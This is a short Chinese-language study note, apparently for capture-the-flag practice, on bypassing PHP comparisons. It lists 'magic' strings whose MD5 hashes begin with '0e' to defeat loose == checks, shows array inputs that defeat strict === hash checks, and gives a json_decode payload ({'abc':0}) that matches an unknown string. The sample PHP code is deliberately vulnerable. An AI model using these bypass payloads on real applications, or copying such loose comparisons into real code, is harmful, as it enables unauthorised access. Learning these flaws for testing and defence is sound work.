# 1. 哈希

## (1). 弱类型比较 ==

```php+HTML
<?php
if(($_GET['a'] != $_GET['b'])&&(md5($_GET['a'])) == md5($_GET['b'])){
    echo "congratulations";
}
```

可以利用 PHP 弱类型比较产生的漏洞

想要满足第二个判断只需要构造出 MD5 值为 0e 开头的字符串，这样的话弱类型比较会认为是科学计数法，0 的多少次方都是 0 ，因此可以绕过

一次 MD5 后 0e 开头的字符串

```shell
240610708
QNKCDZO
s878926199a
s155964671a
s214587387a
s1091221200a
s1184209335a
s1502113478a
s1665632922a
s1836677006a
s1885207154a
```

一次和两次 MD5 后都是 0e 开头的字符串

```shell
CbDLytmyGm2xQyaLNhWn
770hQgrBOjrcqftrlaZk
7r4lGXCH2Ksu2JNT3BYM
```

## (2). 强类型比较 ===

```php+HTML
<?php
if(($_GET['a'] != $_GET['b'])&&(md5($_GET['a'])) === md5($_GET['b'])){
    echo "congratulations";
}
```

### (a). 使用数组比较

在 PHP 中的 hash 函数 MD5 、sha1 等处理中若传入一个数组的值，则会报错返回 NULL ，而返回的值在类型和内容上都是相同的，所以可以用来绕过某些两边参数可控的场景，如果只能控制一边的值传入，则数组类型不适用

传入 a[]=a, b[]=b

满足 a 和 b 不相等，MD5 后又相等的条件，虽然报错，但能够获得输出。

# 2. json 解码绕过

PHP 在处理传入的 json 串时使用 json_decode 将其解码，再进行比较时，我们不需要知道比较字串的内容，也可以利用字符串与 0 比较为真的特点绕过。

```php+HTML
<?php
$flag = 'ook!';
$a = $_GET['a'];
$b = json_decode($a);
echo $b->abc;
var_dump($b->abc == $flag);
if ($b->abc == $flag)
    echo $flag;
else
    echo "error!!";
?>
```

当传入`?a={"abc":0}`时，输出

```php+HTML
0
bool(true) 
ook!
```

注意这里的 `{"abc":0}` ，0是数字，而加双引号 `{"abc":"0"}` 之后两边都是字符，就不相等了。
